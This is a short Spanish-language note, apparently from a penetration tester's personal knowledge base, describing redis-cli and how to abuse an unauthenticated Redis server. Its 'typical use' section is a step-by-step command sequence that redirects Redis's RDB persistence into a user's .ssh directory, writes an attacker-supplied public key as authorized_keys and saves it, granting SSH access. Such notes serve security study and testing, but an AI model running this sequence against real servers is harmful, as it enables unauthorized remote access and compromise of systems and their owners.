---
tags: [herramienta, servicios, redis]
tipo: herramienta
categoria: servicios
ultima_revision: 2026-10-20
---

# redis-cli

Cliente de Redis. Permite leer/escribir claves y, si no hay `AUTH`, abusar de la persistencia RDB para escribir ficheros arbitrarios.

## Uso típico

```bash
redis-cli -h <host>
INFO server
CONFIG GET dir
CONFIG GET dbfilename
CONFIG SET dir /home/<user>/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\n<clave_publica>\n\n"
SAVE
```

## Notas / lecciones

- **Guardar los valores originales** de `dir` y `dbfilename` antes de modificarlos.
- Comprobar con qué **usuario** corre Redis.

## Técnicas relacionadas

- [[Redis-Sin-Autenticacion]], [[SSH-Keys]]
